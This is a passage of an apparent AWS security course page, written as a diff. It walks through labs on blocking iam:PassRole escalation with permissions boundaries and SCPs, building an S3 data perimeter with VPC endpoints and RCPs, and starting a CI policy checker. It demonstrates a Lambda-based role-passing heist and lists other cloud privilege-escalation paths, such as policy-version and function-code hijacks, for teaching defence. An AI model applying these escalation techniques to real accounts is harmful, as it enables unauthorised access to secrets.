+  --content file://scp-protect-privileged-roles.json --query Policy.PolicySummary.Id --output text)
+aws organizations attach-policy --profile sky-mgmt --policy-id "$SCP_ID" --target-id "$DEV_ID"
+echo "SCP $SCP_ID attached to $DEV_ID"</code></pre>
+              <div class="callout gotcha"><strong class="ct">Gotcha: lock yourself out, learn forever</strong><p>The file already exempts <code>OrganizationAccountAccessRole</code> (your <code>sky-dev</code> profile), <code>SkyfortressAdmin</code>, and Identity Center's <code>AWSReservedSSO_AdministratorAccess_*</code> roles. If you reach the dev account any other way, add your role first. Get the exemption wrong and the SCP will also stop <em>you</em> passing privileged roles, and stop CloudFormation stacks that need to. That's recoverable (the management account isn't affected by SCPs, so you can always detach it from <code>sky-mgmt</code>), but it's exactly why SCPs ship to a test OU first.</p></div>
+              <figure class="shot" data-url="console.aws.amazon.com/organizations/v2/home/policies/service-control-policy"><img src="assets/img/day1/shot-scp-targets.svg" alt="Mock-up of the Organizations console: the protect-privileged-roles SCP with its Targets tab showing skyfortress-dev attached directly, and the effective policies list FullAWSAccess, protect-privileged-roles and RCPFullAWSAccess"><figcaption><b>SCREEN 1.2</b> After attaching: <b>Targets</b> shows the account, and the account's effective policies show both the inherited <code>FullAWSAccess</code> and your new SCP. Illustrative mock-up; the live console layout may differ.</figcaption></figure>
+            </li>
+            <li><strong>Re-run the heist</strong>
+<pre data-title="CloudShell"><code class="language-bash">intern aws lambda delete-function --function-name kraken-heist
+intern aws lambda create-function --function-name kraken-heist2 \
+  --runtime python3.12 --handler heist_payload.handler --zip-file fileb://heist.zip \
+  --role "arn:aws:iam::$ACCT:role/privileged/NimbusOpsAutomationRole"</code></pre>
+              <p>Denied: the intern isn't authorized to perform <code>iam:PassRole</code> on the privileged role. Now try the legitimate path:</p>
+<pre data-title="CloudShell"><code class="language-bash">intern aws lambda create-function --function-name intern-hello \
+  --runtime python3.12 --handler heist_payload.handler --zip-file fileb://heist.zip \
+  --role "arn:aws:iam::$ACCT:role/lambda-sandbox/InternSandboxLambdaRole" --query State
+intern aws lambda wait function-active-v2 --function-name intern-hello
+intern aws lambda invoke --function-name intern-hello --cli-binary-format raw-in-base64-out \
+  --payload '{}' out.json &gt;/dev/null &amp;&amp; jq . out.json</code></pre>
+              <p>The function deploys fine (developers stay productive) but returns an AccessDenied on the secret. That's least privilege: the job still works, the heist doesn't.</p>
+            </li>
+            <li><strong>Prove the layers are independent, part 1: break Layer 1</strong>
+              <p>Defence in depth is only real if each layer holds on its own. Define a one-line attack, then deliberately regress the identity policy to the vulnerable version (<code>PassRole</code> on <code>*</code>). The boundary and SCP should still stop you.</p>
+<pre data-title="CloudShell"><code class="language-bash">attempt() { intern aws lambda create-function --function-name kraken-heist3 --runtime python3.12 \
+  --handler heist_payload.handler --zip-file fileb://heist.zip \
+  --role "arn:aws:iam::$ACCT:role/privileged/NimbusOpsAutomationRole" 2&gt;&amp;1 | tail -1; }
+echo "Layer 1 intact:"; attempt
+
+# Regress Layer 1 on purpose: a deliberately broad identity policy
+echo '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["iam:PassRole","lambda:*"],"Resource":"*"}]}' &gt; vuln.json
+aws iam put-role-policy --role-name KrakenInternRole --policy-name InternDeveloperAccess --policy-document file://vuln.json
+sleep 10; echo "boundary + SCP:"; attempt</code></pre>
+              <p><b>Verify:</b> the first error blames <em>no identity-based policy</em>; the second blames the <em>permissions boundary</em>.</p>
+            </li>
+            <li><strong>Prove the layers are independent, part 2: break Layer 2, then restore</strong>
+<pre data-title="CloudShell"><code class="language-bash"># Regress Layer 2 as well
+aws iam delete-role-permissions-boundary --role-name KrakenInternRole
+sleep 10; echo "SCP only:"; attempt
+
+# Restore Layers 1 and 2
+aws iam put-role-policy --role-name KrakenInternRole --policy-name InternDeveloperAccess --policy-document file://intern-fixed-policy.json
+aws iam put-role-permissions-boundary --role-name KrakenInternRole --permissions-boundary "$BOUNDARY_ARN"
+aws iam get-role --role-name KrakenInternRole --query Role.PermissionsBoundary.PermissionsBoundaryArn</code></pre>
+              <p><b>Verify:</b> "SCP only" blames a <em>service control policy</em>, and the last command prints the boundary ARN again.</p>
+              <p class="muted">IAM changes are eventually consistent — the <code>sleep</code>s give them a moment. Read which policy type each error message blames.</p>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">attempt</span><span class="o">   # Layer 1 fixed (scoped PassRole)</span>
+<span class="err">An error occurred (AccessDeniedException) when calling the CreateFunction operation: User: arn:aws:sts::111122223333:assumed-role/KrakenInternRole/kraken is not authorized to perform: iam:PassRole on resource: arn:aws:iam::111122223333:role/privileged/NimbusOpsAutomationRole because no identity-based policy allows the iam:PassRole action</span>
+<span class="o">boundary + SCP:</span>
+<span class="err">… is not authorized to perform: iam:PassRole on resource: arn:aws:iam::111122223333:role/privileged/NimbusOpsAutomationRole with an explicit deny in a permissions boundary</span>
+<span class="o">SCP only:</span>
+<span class="err">… is not authorized to perform: iam:PassRole on resource: arn:aws:iam::111122223333:role/privileged/NimbusOpsAutomationRole with an explicit deny in a service control policy</span></pre></div>
+<p class="term-caption">Three runs, three different gates. If a service returns a shorter message without the <em>because/with</em> clause, use CloudTrail's <code>errorMessage</code> field instead: the reason is recorded there.</p>
+<div class="predict"><p>With Layers 1 and 2 removed, the only thing left is the SCP. Could the intern work around it by passing the role to a <em>different</em> service, like EC2?</p><details><summary>Reveal</summary><p><b>No.</b> The SCP denies <code>iam:PassRole</code> on <code>role/privileged/*</code> for every service and every principal except the exempt admin roles. The service doesn't matter; the role path does. That's why the SCP is the layer that survives future mistakes.</p></details></div>
+            </li>
+          </ol>
+          <div class="checkpoint"><p>You have: the flag from Part A; three error messages from Part B (identity policy, boundary, SCP) each blocking the same <code>create-function</code> call; and <code>intern-hello</code> working with the sandbox role. If the SCP never seems to bite, give it ~60 seconds and confirm the attachment: <code>aws organizations list-policies-for-target --target-id $DEV_ID --filter SERVICE_CONTROL_POLICY --profile sky-mgmt</code>.</p></div>
+<h4>Troubleshooting</h4><div class="table-wrap"><table><thead><tr><th>Symptom</th><th>Likely cause</th><th>Fix</th></tr></thead><tbody><tr><td><code>create-function</code> fails with <code>InvalidParameterValueException: The role defined for the function cannot be assumed by Lambda</code></td><td>IAM eventual consistency right after stack creation</td><td>Wait 10–15 seconds and retry</td></tr><tr><td><code>loot.json</code> contains <code>error</code> instead of <code>loot</code></td><td>You passed a role that can't read the secret (for example the sandbox role)</td><td>Check the <code>--role</code> ARN includes <code>/privileged/</code></td></tr><tr><td>Part B, Layer 3: the heist still works after attaching the SCP</td><td>SCPs take a short time to apply, or you attached it to the wrong target</td><td>Wait ~60s; then <code>aws organizations list-policies-for-target --target-id $DEV_ID --filter SERVICE_CONTROL_POLICY --profile sky-mgmt</code></td></tr><tr><td>Your admin can't update or delete the stack after Layer 3</td><td>Your dev role isn't in the SCP's exemption list</td><td>Detach the SCP from <code>sky-mgmt</code>, add your role ARN, re-create it</td></tr><tr><td><code>lookup-events</code> returns nothing for <code>CreateFunction20150331</code></td><td>CloudTrail event history lags by up to ~5–15 minutes</td><td>Do Part B first and come back to it</td></tr></tbody></table></div>
+          <details class="hint solution"><summary>Full solution notes: other PassRole escalation paths</summary>
+            <p>Lambda is just one of many. The same pattern works with any service that takes a role: <code>ec2:RunInstances</code> + instance profile, <code>ecs:RegisterTaskDefinition</code> + <code>ecs:RunTask</code>, <code>glue:CreateDevEndpoint</code>, <code>cloudformation:CreateStack</code> with <code>--role-arn</code>, <code>datapipeline</code>, <code>sagemaker:CreateNotebookInstance</code>, <code>codebuild:CreateProject</code>. Related escalations that don't need PassRole at all: <code>iam:CreatePolicyVersion</code> (set a new default version), <code>iam:AttachRolePolicy</code> on your own role, <code>iam:UpdateAssumeRolePolicy</code>, and <code>lambda:UpdateFunctionCode</code> on an <em>existing</em> function that already runs as a privileged role. Your Layer 3 SCP covers the tampering half; the boundary's Deny on <code>/privileged/*</code> covers the rest for this role.</p>
+          </details>
+          <div class="stretch"><p>Find the <b>no-PassRole</b> path: grant the intern <code>lambda:UpdateFunctionCode</code> on <code>*</code>, have your admin create a legit function running as <code>NimbusOpsAutomationRole</code>, and show the intern can hijack it by swapping its code. Then write the one-statement fix.</p></div>
+          <div class="cleanup">
+<pre><code class="language-bash">for f in kraken-heist kraken-heist2 kraken-heist3 intern-hello; do aws lambda delete-function --function-name $f 2&gt;/dev/null; done
+aws iam delete-role-permissions-boundary --role-name KrakenInternRole
+aws iam delete-policy --policy-arn "$BOUNDARY_ARN"
+aws cloudformation delete-stack --stack-name sky-heist
+aws organizations detach-policy --profile sky-mgmt --policy-id "$SCP_ID" --target-id "$DEV_ID"
+aws organizations delete-policy --profile sky-mgmt --policy-id "$SCP_ID"
+# Secrets Manager schedules deletion (7–30 days). Force it now for the lab:
+aws secretsmanager delete-secret --secret-id skyfortress/heist/launch-codes --force-delete-without-recovery 2&gt;/dev/null</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- ====================== LAB 1.3 ====================== -->
+      <article class="lab" id="lab-1-3">
+        <img class="lab-cover" src="assets/img/day1/lab3-cover.svg" alt="Lab 1.3 cover: a golden locked bucket inside three glowing rings labelled identity RCP, resource SCP and network VPCE, with attack lines bouncing off each ring">
+        <div class="lab-head">
+          <div class="lab-num">Lab 1.3</div>
+          <h3>Build the Data Perimeter</h3>
+          <div class="chips"><span class="chip hard">Advanced</span><span class="chip">⏱ 60 min</span><span class="chip">💸 ~$0.01</span><span class="chip">Organizations · RCP · SCP · VPC endpoints · S3 · CloudShell VPC</span></div>
+        </div>
+        <div class="lab-body">
+          <p><b>Goal:</b> build all three walls from FIG 1.4 around one vault bucket in <code>skyfortress-dev</code>, and prove each one by attacking it. The flag is in <code>vault/flag.txt</code> — readable <b>only</b> through your VPC endpoint. Not even your admin session can read it from the internet.</p>
+          <div class="paths">
+            <div class="path guided"><p>Ten steps: deploy, test from outside, step inside with a CloudShell VPC environment, then add the RCP and SCP and re-test.</p></div>
+            <div class="path challenge"><p><b>Goal:</b> read <code>vault/flag.txt</code>, then prove four distinct denials. <b>Constraints:</b> you may not edit the vault bucket policy's network deny or the endpoint policy. <b>Accept when:</b> you can show (1) a vault read from the internet denied by the bucket policy, (2) a non-org bucket denied from inside the VPC by the endpoint policy, (3) an outsider denied by an RCP, and (4) a non-org bucket denied from the internet by an SCP, each with the error that names its policy type.</p></div>
+          </div>
+          <figure class="figure"><img src="assets/img/day1/data-perimeter.svg" alt="The data perimeter you will build: VPC with CloudShell VPC environment, S3 gateway endpoint with org conditions, vault bucket with SourceVpce deny, RCP blocking outsiders, SCP blocking access to non-org buckets"><figcaption><b>FIG L1.3</b> Your build. Each red arrow is a test you'll run.</figcaption></figure>
+          <p><b>What gets deployed (<a href="labs/day1/data-perimeter.yaml">data-perimeter.yaml</a>):</b> a VPC with one private subnet and <em>no internet route</em>; an S3 gateway endpoint whose policy requires both <code>aws:PrincipalOrgID</code> and <code>aws:ResourceOrgID</code>; a vault bucket denying <code>GetObject</code> on <code>vault/*</code> unless <code>aws:SourceVpce</code> matches; a custom resource that seeds the flag; and a security group for a CloudShell VPC environment. Then you'll add an <a href="labs/day1/rcp-org-only-resources.json">RCP</a> and an <a href="labs/day1/scp-org-only-resources.json">SCP</a> by hand.</p>
+
+          <h4>Steps</h4>
+          <ol class="steps" data-lab="d1-lab3">
+            <li><strong>Find your org ID and root ID</strong>
+<pre data-title="CloudShell"><code class="language-bash">cd ~/sky/day1
+ORG_ID=$(aws organizations describe-organization --profile sky-mgmt --query Organization.Id --output text)
+ROOT_ID=$(aws organizations list-roots --profile sky-mgmt --query 'Roots[0].Id' --output text)
+DEV_ID=$(aws sts get-caller-identity --profile sky-dev --query Account --output text)
+echo "org=$ORG_ID root=$ROOT_ID dev=$DEV_ID"</code></pre>
+            </li>
+            <li><strong>Deploy the perimeter stack into dev</strong>
+<pre data-title="CloudShell"><code class="language-bash">export AWS_PROFILE=sky-dev AWS_REGION=us-east-1
+aws cloudformation deploy --stack-name sky-perimeter --template-file data-perimeter.yaml \
+  --parameter-overrides OrgId=$ORG_ID --capabilities CAPABILITY_IAM
+eval "$(aws cloudformation describe-stacks --stack-name sky-perimeter \
+  --query 'Stacks[0].Outputs[].[OutputKey,OutputValue]' --output text | awk '{print "export "$1"="$2}')"
+echo "vpc=$VpcId subnet=$PrivateSubnetId sg=$CloudShellSecurityGroupId vpce=$S3EndpointId bucket=$VaultBucket"</code></pre>
+            </li>
+            <li><strong>Baseline tests from the public internet</strong>
+              <p><b>Predict</b> each line before running it:</p>
+<pre data-title="CloudShell (regular, internet-connected)"><code class="language-bash">aws s3 cp "s3://$VaultBucket/public-notes/readme.txt" -      # A
+aws s3 cp "s3://$VaultBucket/vault/flag.txt" -               # B
+aws s3 ls s3://noaa-ghcn-pds/ | head -3                       # C  (an AWS Open Data bucket, outside your org)</code></pre>
+              <p>A works, B is denied by the bucket policy (wrong network), C works — for now. Hold on to C.</p>
+<div class="predict"><p>Your admin session owns this bucket. Will B work from the public CloudShell?</p><details><summary>Reveal</summary><p><b>No: explicit deny in a resource-based policy.</b> The vault statement denies <code>s3:GetObject</code> on <code>vault/*</code> to <em>every</em> principal unless <code>aws:SourceVpce</code> is your endpoint, and public CloudShell traffic doesn't use that endpoint.</p></details></div>
+<div class="term" data-title="CloudShell · sky-dev · public"><pre><span class="p">$</span> <span class="c">aws s3 cp "s3://$VaultBucket/public-notes/readme.txt" -</span><span class="o">      # A</span>
+Welcome to the Nimbus vault. Nothing to see here.
+<span class="p">$</span> <span class="c">aws s3 cp "s3://$VaultBucket/vault/flag.txt" -</span><span class="o">               # B</span>
+<span class="err">fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden</span>
+<span class="p">$</span> <span class="c">aws s3api get-object --bucket "$VaultBucket" --key vault/flag.txt /dev/stdout</span><span class="o">   # B, with the reason</span>
+<span class="err">An error occurred (AccessDenied) when calling the GetObject operation: User: arn:aws:sts::111122223333:assumed-role/OrganizationAccountAccessRole/botocore-session-1732… is not authorized to perform: s3:GetObject on resource: "arn:aws:s3:::skyfortress-vault-111122223333/vault/flag.txt" with an explicit deny in a resource-based policy</span>
+<span class="p">$</span> <span class="c">aws s3 ls s3://noaa-ghcn-pds/ | head -3</span><span class="o">   # C</span>
+<span class="o">                           PRE csv.gz/
+                           PRE csv/
+                           PRE parquet/</span></pre></div>
+<p class="term-caption"><code>aws s3 cp</code> hides the reason behind a HEAD request; <code>s3api get-object</code> reveals it. The readme text and open-data listing may differ; what matters is A ✓, B ✕ (resource policy), C ✓.</p>
+            </li>
+            <li><strong>Step inside the perimeter: a CloudShell VPC environment</strong>
+              <p>CloudShell can launch an environment <em>inside</em> your VPC. In the console, switch to the <code>skyfortress-dev</code> account, open <b>CloudShell → Actions → Create VPC environment</b>, and choose:</p>
+              <ul><li>Name: <code>sky-perimeter</code></li><li>VPC: the <code>VpcId</code> output · Subnet: <code>PrivateSubnetId</code> · Security group: <code>CloudShellSecurityGroupId</code></li></ul>
+              <p class="muted">Alternative if your console account differs: launch a small EC2 instance in that subnet and connect with Session Manager. That needs SSM interface endpoints (~$0.03/hr) — CloudShell VPC is free.</p>
+              <figure class="shot" data-url="console.aws.amazon.com/cloudshell/home?region=us-east-1"><img src="assets/img/day1/shot-cloudshell-vpc.svg" alt="Mock-up of the CloudShell Create a VPC environment dialog with name sky-perimeter, the lab VPC, the private subnet with no internet gateway, and the CloudShellSecurityGroup, plus a callout mapping each field to the stack outputs"><figcaption><b>SCREEN 1.3</b> Map each field to a stack output. If the VPC dropdown is empty, you're signed in to the wrong account in the console. Illustrative mock-up; the live console layout may differ.</figcaption></figure>
+              <p><b>Verify:</b> a new tab opens named <code>sky-perimeter</code>, and <code>curl -m 5 https://example.com</code> in it times out.</p>
+            </li>
+            <li><strong>Read the vault from inside</strong>
+              <p>In the <b>VPC environment</b> tab (paste your bucket name — env vars don't carry over):</p>
+<pre data-title="CloudShell VPC environment"><code class="language-bash">export AWS_REGION=us-east-1
+aws s3 cp s3://skyfortress-vault-&lt;DEV_ACCOUNT_ID&gt;/vault/flag.txt - | base64 -d; echo   # 🚩
+aws s3 ls s3://noaa-ghcn-pds/ | head -3                                # blocked: endpoint policy (ResourceOrgID)
+curl -m 5 https://example.com || echo "no internet route — as designed"</code></pre>
+              <p>The flag prints. The open-data bucket fails — this time the <b>VPC endpoint policy</b> refused because that bucket isn't in your org. You just saw the network wall and a resource wall in one shell.</p>
+<div class="term" data-title="CloudShell · VPC environment sky-perimeter"><pre><span class="p">$</span> <span class="c">aws s3 cp s3://skyfortress-vault-111122223333/vault/flag.txt - | base64 -d; echo</span>
+<span class="hl">SKY{███████████████████}</span>
+<span class="p">$</span> <span class="c">aws s3 ls s3://noaa-ghcn-pds/ | head -3</span>
+<span class="err">An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::111122223333:assumed-role/OrganizationAccountAccessRole/… is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::noaa-ghcn-pds" because no VPC endpoint policy allows the s3:ListBucket action</span>
+<span class="p">$</span> <span class="c">curl -m 5 https://example.com || echo "no internet route — as designed"</span>
+<span class="o">curl: (28) Connection timed out after 5001 milliseconds</span>
+no internet route — as designed</pre></div>
+<p class="term-caption">Inside the perimeter the vault opens, and the endpoint itself refuses to carry traffic to buckets outside your org.</p>
+            </li>
+            <li><strong>Enable RCPs in the organization</strong>
+<pre data-title="CloudShell (management account)"><code class="language-bash">aws organizations enable-policy-type --profile sky-mgmt --root-id "$ROOT_ID" --policy-type RESOURCE_CONTROL_POLICY
+aws organizations list-roots --profile sky-mgmt --query 'Roots[0].PolicyTypes'</code></pre>
+              <p>AWS automatically attaches <code>RCPFullAWSAccess</code> everywhere. Like <code>FullAWSAccess</code> for SCPs, it doesn't grant anything — it just means "no ceiling yet".</p>
+            </li>
+            <li><strong>Prepare an "outsider" test</strong>
+              <p>You need a request from outside your org. Pick one:</p>
+              <div class="tabs">
+                <div class="tab-list"><button>Buddy test (recommended)</button><button>Solo: anonymous request</button></div>
+                <div class="tab-panel">
+                  <p>Pair with a classmate (different org). Add a statement to <b>your</b> vault bucket policy granting their account <code>s3:GetObject</code> on <code>public-notes/*</code>, then have them run <code>aws s3 cp s3://YOUR_BUCKET/public-notes/readme.txt -</code>. It should work <b>now</b> — a perfectly normal cross-account grant.</p>
+<pre data-title="add to the VaultBucketPolicy Statement array (console → S3 → Permissions)"><code class="language-json">{
+  "Sid": "BuddyTest",
+  "Effect": "Allow",
+  "Principal": { "AWS": "arn:aws:iam::BUDDY_ACCOUNT_ID:root" },
+  "Action": "s3:GetObject",
+  "Resource": "arn:aws:s3:::skyfortress-vault-DEV_ACCOUNT_ID/public-notes/*"
+}</code></pre>
+                </div>
+                <div class="tab-panel">
+                  <p>Create a throwaway bucket, deliberately make one object public, and fetch it with <code>curl</code> (no credentials at all).</p>
+<pre data-title="CloudShell (sky-dev)"><code class="language-bash">TEST=sky-rcp-test-$DEV_ID
+aws s3 mb s3://$TEST
+aws s3api put-public-access-block --bucket $TEST --public-access-block-configuration \
+  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=false,RestrictPublicBuckets=false
+echo "hello from the open sky" | aws s3 cp - s3://$TEST/open.txt
+aws s3api put-bucket-policy --bucket $TEST --policy "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$TEST/open.txt\"}]}"
+curl -s -o /dev/null -w "%{http_code}\n" https://$TEST.s3.amazonaws.com/open.txt    # expect 200</code></pre>
+                  <p class="muted">If <code>put-bucket-policy</code> fails, account-level Block Public Access is on (<code>aws s3control get-public-access-block --account-id $DEV_ID</code>). Either use the buddy test or turn it off temporarily and turn it back on in cleanup.</p>
+                </div>
+              </div>
+            </li>
+            <li><strong>Raise the identity wall: attach the RCP</strong>
+              <p>Read <a href="labs/day1/rcp-org-only-resources.json">rcp-org-only-resources.json</a>. Three statements: org identities only, confused-deputy protection for AWS service principals (<code>aws:SourceOrgID</code>), and TLS only. Note <code>"Principal": "*"</code> — mandatory in RCPs — and the <code>IfExists</code> operators, which make the deny apply to anonymous callers (no <code>PrincipalOrgID</code> key at all).</p>
+<pre data-title="CloudShell (management account)"><code class="language-bash">sed "s/o-REPLACEME/$ORG_ID/g" rcp-org-only-resources.json &gt; rcp.json
+RCP_ID=$(aws organizations create-policy --profile sky-mgmt --type RESOURCE_CONTROL_POLICY \
+  --name org-identities-only --description "Only org principals may touch our resources" \
+  --content file://rcp.json --query Policy.PolicySummary.Id --output text)
+aws organizations attach-policy --profile sky-mgmt --policy-id "$RCP_ID" --target-id "$DEV_ID"</code></pre>
+              <p>Re-run your outsider test. Buddy: AccessDenied. Solo: <code>curl</code> now returns <b>403</b>. The bucket policy still says "allow" — the RCP is a ceiling above it, set by the org, that the account can't remove.</p>
+<div class="predict"><p>The test bucket's policy still says <code>"Principal": "*"</code>. After attaching the RCP, does the anonymous <code>curl</code> still get 200?</p><details><summary>Reveal</summary><p><b>No, 403.</b> An anonymous request has no <code>aws:PrincipalOrgID</code>, so <code>StringNotEqualsIfExists</code> matches, and <code>aws:PrincipalIsAWSService</code> is false. The RCP's deny applies, and a deny beats the bucket policy's allow.</p></details></div>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">curl -s -o /dev/null -w "%{http_code}\n" https://$TEST.s3.amazonaws.com/open.txt</span><span class="o">   # before the RCP</span>
+<span class="ok">200</span>
+<span class="p">$</span> <span class="c">aws organizations attach-policy --profile sky-mgmt --policy-id "$RCP_ID" --target-id "$DEV_ID"</span>
+<span class="p">$</span> <span class="c">curl -s -o /dev/null -w "%{http_code}\n" https://$TEST.s3.amazonaws.com/open.txt</span><span class="o">   # after</span>
+<span class="err">403</span></pre></div>
+<p class="term-caption">Same bucket policy, same object. The org-level ceiling turned a public object private. Give the RCP up to a minute to take effect.</p>
+            </li>
+            <li><strong>Raise the resource wall: attach the SCP</strong>
+              <p>Read <a href="labs/day1/scp-org-only-resources.json">scp-org-only-resources.json</a>: org principals may only read/write S3 objects in org-owned buckets, except when CloudFormation or Athena calls on their behalf, or for an explicit <code>/perimeter-exempt/</code> role path.</p>
+<pre data-title="CloudShell (management account)"><code class="language-bash">sed "s/o-REPLACEME/$ORG_ID/g" scp-org-only-resources.json &gt; scp-res.json
+SCPR_ID=$(aws organizations create-policy --profile sky-mgmt --type SERVICE_CONTROL_POLICY \
+  --name s3-org-resources-only --description "No reading/writing buckets outside the org" \
+  --content file://scp-res.json --query Policy.PolicySummary.Id --output text)
+aws organizations attach-policy --profile sky-mgmt --policy-id "$SCPR_ID" --target-id "$DEV_ID"
+sleep 30; aws s3 ls s3://noaa-ghcn-pds/ --profile sky-dev | head -3     # test C again</code></pre>
+              <p>Test C now fails from the <em>public</em> CloudShell too: explicit deny in a service control policy (<code>…is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::noaa-ghcn-pds" with an explicit deny in a service control policy</code>). This is the wall that stops an insider (or a Kraken with stolen creds) from copying data into <code>s3://kraken-loot</code> — even though their own bucket policy would happily accept it.</p>
+            </li>
+            <li><strong>Map every test to its wall</strong>
+              <p>Fill in this table in your notes, then compare with the hint:</p>
+              <div class="table-wrap"><table>
+                <thead><tr><th>Test</th><th>Result</th><th>Blocked by</th><th>Key</th></tr></thead>
+                <tbody>
+                  <tr><td>B · vault read from internet</td><td>?</td><td>?</td><td>?</td></tr>
+                  <tr><td>Open-data bucket from VPC</td><td>?</td><td>?</td><td>?</td></tr>
+                  <tr><td>Outsider reading public-notes</td><td>?</td><td>?</td><td>?</td></tr>
+                  <tr><td>Open-data bucket from internet</td><td>?</td><td>?</td><td>?</td></tr>
+                </tbody>
+              </table></div>
+              <details class="hint"><summary>Answer key</summary><p>B → bucket policy deny (resource policy), <code>aws:SourceVpce</code>. VPC → endpoint policy, <code>aws:ResourceOrgID</code>. Outsider → RCP, <code>aws:PrincipalOrgID</code>. Internet open-data → SCP, <code>aws:ResourceOrgID</code>.</p></details>
+            </li>
+          </ol>
+          <div class="checkpoint"><p>Four tests, four denials, four different policy types, and one flag read from inside the VPC. If the RCP didn't change your outsider result, confirm it's attached to the <em>account that owns the bucket</em> (RCPs apply to resources in the target account): <code>aws organizations list-policies-for-target --target-id $DEV_ID --filter RESOURCE_CONTROL_POLICY --profile sky-mgmt</code>.</p></div>
+          <h4>Troubleshooting</h4><div class="table-wrap"><table><thead><tr><th>Symptom</th><th>Likely cause</th><th>Fix</th></tr></thead><tbody><tr><td>Stack fails: <code>OrgId</code> parameter pattern</td><td><code>$ORG_ID</code> is empty because <code>sky-mgmt</code> isn't set up</td><td>Re-run step 1 and check that it prints <code>org=o-…</code></td></tr><tr><td>Commands in the VPC environment hang</td><td>No route to the gateway endpoint, or the SG blocks egress 443</td><td>The stack associates the route table; check you chose <code>PrivateSubnetId</code> and the stack's SG</td></tr><tr><td>Fast <code>403 … HeadObject</code> inside the VPC</td><td>Route works, but a policy said no (you used the wrong bucket name?)</td><td>Use the exact bucket name <code>skyfortress-vault-&lt;dev account&gt;</code>; check with <code>s3api get-object</code></td></tr><tr><td><code>put-bucket-policy</code> fails in the solo test</td><td>Account-level S3 Block Public Access is on (good!)</td><td>Use the buddy test, or disable BPA temporarily and restore it in cleanup</td></tr><tr><td>The RCP doesn't change the outsider result</td><td>RCP attached to the wrong account, or the outsider is in your org</td><td>RCPs apply to resources in the account they're attached to; attach to <code>$DEV_ID</code></td></tr><tr><td>After the SCP, CloudFormation in dev can't read templates or artifacts</td><td>Your SCP blocks S3 buckets outside the org</td><td>That's the AWS-owned-resource gotcha; the SCP already exempts calls made via CloudFormation, so check that the call really is via CFN</td></tr></tbody></table></div>
+          <details class="hint"><summary>Hint: my VPC environment can't reach S3 at all</summary><p>The gateway endpoint must be associated with the <em>subnet's</em> route table (the stack does this), the security group must allow egress on 443, and you must use the regional endpoint (<code>AWS_REGION=us-east-1</code>). A hanging command usually means the route is missing; a fast 403 means the route works and a policy said no.</p></details>
+          <form class="flag" data-id="d1-flag3" data-hash="7145d8bc6e82c463b08839715d4df72e9cdd33cb89324b7424d294a3dddc33a8" data-xp="200" data-label="Flag 1.3 · inside the perimeter"></form>
+          <div class="callout new"><strong class="ct">Where this goes in production</strong><p>Real perimeters live in the AWS <em>data-perimeter-policy-examples</em> repository and are rolled out OU by OU. Use IAM Access Analyzer's external access findings and CloudTrail <code>errorCode</code> analysis to find legitimate traffic you'd break <em>before</em> attaching. On Day 2 you'll query exactly that kind of data in Security Lake.</p></div>
+          <div class="stretch"><p>Add a <b>network wall for identities</b>: an SCP that denies <code>s3:GetObject</code> to org principals unless <code>aws:SourceVpce</code> is one of your endpoints <em>or</em> <code>aws:ViaAWSService</code> is true <em>or</em> <code>aws:PrincipalIsAWSService</code> is true. Test that the Athena console can still query a bucket. What breaks?</p></div>
+          <div class="cleanup">
+<pre><code class="language-bash"># 1) In the console: CloudShell → Actions → Delete the sky-perimeter VPC environment (it holds an ENI in the subnet)
+# 2) Org policies
+for P in $RCP_ID $SCPR_ID; do
+  aws organizations detach-policy --profile sky-mgmt --policy-id $P --target-id $DEV_ID
+  aws organizations delete-policy --profile sky-mgmt --policy-id $P
+done
+# 3) Stack (the custom resource deletes the seeded objects)
+aws cloudformation delete-stack --stack-name sky-perimeter --profile sky-dev
+# 4) Solo-test bucket, if you made one
+aws s3 rb s3://sky-rcp-test-$DEV_ID --force --profile sky-dev 2&gt;/dev/null</code></pre>
+            <p>Leave RCPs <em>enabled</em> as a policy type — you'll want them later in the week.</p>
+          </div>
+        </div>
+      </article>
+
+      <!-- ====================== LAB 1.4 ====================== -->
+      <article class="lab" id="lab-1-4">
+        <img class="lab-cover" src="assets/img/day1/lab4-cover.svg" alt="Lab 1.4 cover: a friendly purple robot with an SMT solver chest panel stamps DENY on a policy document containing s3:* while approved documents with green checkmarks ride a conveyor belt">
+        <div class="lab-head">
+          <div class="lab-num">Lab 1.4</div>
+          <h3>The Least-Privilege Robot</h3>
+          <div class="chips"><span class="chip med">Intermediate</span><span class="chip">⏱ 50 min</span><span class="chip">💸 ~$0.05</span><span class="chip">Access Analyzer · GitHub Actions · OIDC</span></div>
+        </div>
+        <div class="lab-body">
+          <p><b>Goal:</b> build a CI robot that refuses to merge any policy granting new access, critical actions, or public access — using IAM Access Analyzer custom policy checks — and authenticate it to AWS with OIDC (no keys). The flag is encoded in which sample policies the robot rejects.</p>
+          <div class="paths">
+            <div class="path guided"><p>Part A runs the checks by hand (5 steps). Part B wires them into a GitHub repo with OIDC and a required status check (6 steps).</p></div>
+            <div class="path challenge"><p><b>Goal:</b> a pull request that adds <code>s3:PutBucketPolicy</code> to an app policy can't be merged, and the CI job never holds a long-lived AWS key. <b>Constraints:</b> the CI role may call only Access Analyzer check APIs, and its trust is pinned to one repo. <b>Accept when:</b> your PR shows a failing required check, a run from a different repo can't assume the role, and you've captured the flag from the robot's verdicts on the five sample policies.</p></div>
+          </div>
+          <figure class="figure"><img src="assets/img/day1/robot-pipeline.svg" alt="Pipeline: pull request, GitHub OIDC token with pinned sub claim, AssumeRole into SkyfortressPolicyRobot, Access Analyzer automated reasoning, then merge or block; three check types described below"><figcaption><b>FIG L1.4</b> The robot never sees a long-lived credential and can only call the three check APIs.</figcaption></figure>
